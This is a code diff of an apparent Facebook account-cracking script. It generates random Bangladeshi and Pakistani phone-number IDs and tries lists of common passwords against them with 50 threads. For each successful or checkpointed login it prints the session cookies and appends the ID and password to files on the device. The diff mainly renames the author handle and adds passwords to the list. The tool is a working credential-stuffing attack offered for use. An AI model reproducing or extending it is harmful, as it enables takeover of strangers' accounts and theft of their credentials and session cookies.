@@ -5,20 +5,21 @@ import requests
 import uuid
 import marshal, base64, zlib
 os.system('clear')
-def o():
+def Riyad():
     os.system('clear')
     print(logo)
     ip = requests.get("https://api.ipify.org").text
-    jalan("     \033[1;33m[\033[1;33m] \033[92;1mIP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
-    print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
-    jalan("     \033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
-    print("     \033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN MY GROUP ")
-    Mahin = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
-    if Mahin == '1':
+    print("\33[m\033[1;91m\033[1;41m\033[1;97m-------------------------------------------\033[;0m\033[1;91m\033[1;92m")
+    jalan("\033[1;33m[\033[1;33m] \033[92;1mIP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
+    print("\33[m\033[1;91m\033[1;41m\033[1;97m-------------------------------------------\033[;0m\033[1;91m\033[1;92m")
+    jalan("\033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
+    print("\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN MY GROUP ")
+    Riyad = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
+    if Riyad == '1':
         i()
-    if Mahin == '2':
+    if Riyad == '2':
         os.system('xdg-open https://www.facebook.com/gsriyad11')
-    if Mahin == 'E':
+    if Riyad == 'E':
         os.system('exit')
         return None
 import os,sys,time,json,random,re,string,platform,base64,uuid
@@ -58,8 +59,8 @@ class jalan:
 
 def back():
 	login()
-Mahin="Mahin"
-imt="SETU"
+Riyad="Riyad"
+imt="Riyad"
 ak="CLASS3-"
 myid=uuid.uuid4().hex[:8].upper()
 
@@ -112,11 +113,11 @@ logo=("""\033[1;97m
 \033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
 \033[1;92m╚═════════════════════════════════════════╝""")
 try:
-    print("\033[38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
+    print("\033[38;5;46m\n(TOOL UPDATE SUCCESSFUL DONE)\n")
     time.sleep(2)
-    Mahin()
+    Riyad()
     print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
-    Mahin()
+    Riyad()
     v = 5.2
     update = ('5.2')
     update = ('5.2')
@@ -188,38 +189,39 @@ def i():
     os.geteuid
     os.system("clear")
     print(logo)
-    print("            \033[1;92m8 DIGIT \033[1;95mCLONING \033[97;1m[\033[92;1mENJOY\033[97;1m]")
-    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
-    print('    \033[97;1m[\033[92;1m\033[97;1m]\033[38;5;46mPK CODE    \033[38;5;196m:\033[1;97m 92301 92302 92303 92305')
-    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
-    print('    \033[97;1m[\033[92;1m\033[97;1m]\033[38;5;46mBD CODE    \033[38;5;196m:\033[1;97m 88016 88017 88018 88019')
-    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
-    code = input('    \033[38;5;196mINPUT CODE \033[1;97m: ')
+    print('\033[38;5;46--------------------------------------------')
+    print('\x1b[1;93mBANGLADESH & PAKISTAN RANDOM NUMBER CLONED')
+    print('\033[38;5;46--------------------------------------------')
+    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mPK CODE    \033[38;5;196m:\x1b[1;95m 92301 92302 92303 92305 ')
+    print('\033[38;5;46--------------------------------------------')
+    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mBD CODE    \033[38;5;196m:\x1b[1;95m 88016 88017 88018 88019 ')
+    print('\033[38;5;46--------------------------------------------')
+    code = input('\033[38;5;196mINPUT CODE \033[1;97m: ')
     print("")
     os.system('clear')
     print(logo)
-    print("             \033[1;97m[\033[1;33mMR-GSXD-404-CYBER\033[1;97m]")
-    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
-    print("    \033[97;1m[\033[92;1m✔️\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
-    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
-    limit = int(input("    \033[97;1m[\033[92;1m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
+    print("           \033[1;97m[\033[1;33mGS-XD\--👽--/\033[1;97m]")
+    print("\033[38;5;46--------------------------------------------")
+    print("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
+    print("\033[38;5;46--------------------------------------------")
+    limit = int(input("\033[97;1m[\033[92;1m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
     
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as setu:
+    with ThreadPool(max_workers=50) as Riyad:
         clear()
         tl = str(len(user))
-        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
-        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
-        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
-        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
-        jalan("     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE✈️")
-        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
+        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
+        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
+        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
+        print('\033[38;5;46--------------------------------------------')
+        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
+        print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','0987654']
+            pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025']
             uid = code+love
-            setu.submit(rcrack,uid,pwx,tl)
+            Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
  
 def rcrack(uid,pwx,tl):
@@ -263,23 +265,23 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[GS XD-OK[] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES[💉] : \033[38;5;46m'+coki+ ' ')                
+                print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
                 open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;196m[GS XD-CP[] ' +uid+ '|' +ps+ '  \33[0;97m')
+                print('\033[38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33[0;97m')
                 open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\33[1;93m[\33[m-META\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r\33[1;93m[\33〔᚛GS XD-OK\033[0m/%s\33[1;93m᚜〕\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
-
-o()
+        
+Riyad()
